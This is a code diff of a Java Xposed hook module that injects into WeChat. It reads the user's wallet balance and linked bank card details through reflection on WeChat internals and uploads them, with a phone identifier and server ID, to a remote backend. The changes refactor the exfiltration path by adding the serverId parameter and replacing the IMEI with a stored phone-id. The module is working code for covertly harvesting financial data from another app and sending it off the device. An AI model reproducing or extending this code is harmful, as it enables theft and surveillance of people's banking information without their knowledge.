@@ -5,14 +5,14 @@ import android.util.Log;
 
 import com.blankj.utilcode.util.EncodeUtils;
 import com.blankj.utilcode.util.EncryptUtils;
-import com.blankj.utilcode.util.PhoneUtils;
 import com.gentcent.wechat.zzk.MainManager;
-import com.gentcent.wechat.zzk.util.GsonUtils;
-import com.gentcent.wechat.zzk.util.ThreadPoolUtils;
 import com.gentcent.wechat.zzk.background.UploadUtil;
-import com.gentcent.wechat.zzk.util.XLog;
 import com.gentcent.wechat.zzk.model.wallet.bean.EnWalletBean;
 import com.gentcent.wechat.zzk.model.wallet.bean.WalletBean;
+import com.gentcent.wechat.zzk.util.GsonUtils;
+import com.gentcent.wechat.zzk.util.MyHelper;
+import com.gentcent.wechat.zzk.util.ThreadPoolUtils;
+import com.gentcent.wechat.zzk.util.XLog;
 import com.gentcent.zzk.xped.XposedHelpers;
 import com.gentcent.zzk.xped.callbacks.XC_LoadPackage.LoadPackageParam;
 
@@ -30,15 +30,14 @@ public class Dibs {
 	public static boolean flag = false;
 	public static boolean reflag = false;
 	
-	public static void requestDataCallback(final LoadPackageParam lpparam, boolean z) {
+	public static void requestDataCallback(final LoadPackageParam lpparam, boolean z, final String serverId) {
 		XLog.d("requestDataCallback in");
 		if (flag) {
 			flag = false;
 			if (z) {
 				ThreadPoolUtils.getInstance().a(new Runnable() {
 					public void run() {
-						Dibs.sendWalletInfo(lpparam);
-						XLog.d(TAG + " requestDataCallback money :");
+						Dibs.sendWalletInfo(lpparam, serverId);
 						double dibs = Dibs.getDibs(MainManager.wxLpparam);
 						XLog.d(TAG + "ddd :" + dibs);
 					}
@@ -48,10 +47,10 @@ public class Dibs {
 			WalletBean walletBean = new WalletBean();
 			walletBean.cards = Bankcard.getBankcards(lpparam);
 			walletBean.Dibs = -1.0d;
-			String contents = GsonUtils.GsonString(walletBean);
 			EnWalletBean enWalletBean = new EnWalletBean();
-			enWalletBean.Contents = contents;
-			enWalletBean.Imei = PhoneUtils.getIMEI();
+			enWalletBean.content = walletBean;
+			enWalletBean.phoneId = MyHelper.readLine("phone-id");
+			enWalletBean.serverId = serverId;
 			UploadUtil.sendToBack(enWalletBean);
 		}
 	}
@@ -65,7 +64,7 @@ public class Dibs {
 		ArrayList arrayList = new ArrayList();
 		for (int i = 0; i < length; i++) {
 			if (i == length - 1) {
-				arrayList.add(new BASE64Encoder().encode(EncryptUtils.encryptRSA(walletBeanJson.substring(i * 50, walletBeanJson.length()).getBytes(), EncodeUtils.base64Decode(str2.getBytes()), true, "RSA/ECB/PKCS1Padding")));
+				arrayList.add(new BASE64Encoder().encode(EncryptUtils.encryptRSA(walletBeanJson.substring(i * 50).getBytes(), EncodeUtils.base64Decode(str2.getBytes()), true, "RSA/ECB/PKCS1Padding")));
 			} else {
 				arrayList.add(new BASE64Encoder().encode(EncryptUtils.encryptRSA(walletBeanJson.substring(i * 50, (i + 1) * 50).getBytes(), EncodeUtils.base64Decode(str2.getBytes()), true, "RSA/ECB/PKCS1Padding")));
 			}
@@ -73,11 +72,11 @@ public class Dibs {
 		return arrayList;
 	}
 	
-	public static void requestDataIsRe(LoadPackageParam loadPackageParam, boolean z) {
-		requestData(loadPackageParam, z);
+	public static void requestDataIsRe(boolean z, String serverId) {
+		requestData(MainManager.wxLpparam, z, serverId);
 	}
 	
-	public static void requestData(final LoadPackageParam loadPackageParam, boolean z) {
+	public static void requestData(final LoadPackageParam loadPackageParam, boolean z, final String serverId) {
 		XLog.d("requestData  联网请求函数");
 		flag = true;
 		try {
@@ -91,51 +90,43 @@ public class Dibs {
 				public void run() {
 					int errCode = XposedHelpers.getIntField(objectField2, "errCode");
 					if (errCode == 0) {
-						Dibs.requestDataCallback(loadPackageParam, true);
+						Dibs.requestDataCallback(loadPackageParam, true, serverId);
 					} else {
-						Dibs.requestDataCallback(loadPackageParam, false);
+						Dibs.requestDataCallback(loadPackageParam, false, serverId);
 					}
 				}
 			});
 			XposedHelpers.callMethod(XposedHelpers.getStaticObjectField(loadPackageParam.classLoader.loadClass("com.tencent.mm.sdk.b.a"), "yVI"), "a", newInstance, Looper.myLooper());
 		} catch (Throwable th) {
 			if (z) {
-				StringBuilder sb = new StringBuilder();
-				sb.append("requestData error:");
-				sb.append(th.getMessage());
-				XLog.d(TAG + sb.toString());
+				XLog.d(TAG + "requestData error:" + th.getMessage());
 				WalletBean walletBean = new WalletBean();
 				walletBean.cards = Bankcard.getBankcards(loadPackageParam);
-				StringBuilder sb2 = new StringBuilder();
-				sb2.append(" requestDataCallback error  cards :");
-				sb2.append(GsonUtils.GsonString(walletBean.cards));
-				XLog.d(TAG + sb2.toString());
+				XLog.d(TAG + " requestDataCallback error  cards :" + GsonUtils.GsonString(walletBean.cards));
 				walletBean.Dibs = -1.0d;
-				StringBuilder sb3 = new StringBuilder();
-				sb3.append("requestDataCallback error walletBean :");
-				sb3.append(GsonUtils.GsonString(walletBean));
-				XLog.d(TAG + sb3.toString());
-				String contents = GsonUtils.GsonString(walletBean);
+				XLog.d(TAG + "requestDataCallback error walletBean :" + GsonUtils.GsonString(walletBean));
 				EnWalletBean enWalletBean = new EnWalletBean();
-				enWalletBean.Contents = contents;
-				enWalletBean.Imei = PhoneUtils.getIMEI();
+				enWalletBean.content = walletBean;
+				enWalletBean.phoneId = MyHelper.readLine("phone-id");
+				enWalletBean.serverId = serverId;
 				UploadUtil.sendToBack(enWalletBean);
 				th.printStackTrace();
 			}
 		}
 	}
 	
-	public static void sendWalletInfo(LoadPackageParam loadPackageParam) {
+	public static void sendWalletInfo(LoadPackageParam loadPackageParam, String serverId) {
 		WalletBean walletBean = new WalletBean();
 		walletBean.cards = Bankcard.getBankcards(loadPackageParam);
 		XLog.d(TAG + "requestDataCallback  cards :" + GsonUtils.GsonString(walletBean.cards));
 		double dibs = getDibs(loadPackageParam);
 		walletBean.Dibs = dibs;
 		XLog.d(TAG + "requestDataCallback  walletBean :" + GsonUtils.GsonString(walletBean));
-		String contents = GsonUtils.GsonString(walletBean);
 		EnWalletBean enWalletBean = new EnWalletBean();
-		enWalletBean.Contents = contents;
-		enWalletBean.Imei = PhoneUtils.getIMEI();
+		enWalletBean.content = walletBean;
+		enWalletBean.phoneId = MyHelper.readLine("phone-id");
+		enWalletBean.serverId = serverId;
+		XLog.e("serverId:" + serverId);
 		UploadUtil.sendToBack(enWalletBean);
 		XLog.d(TAG + "sendWalletInfo money :" + dibs);
 	}
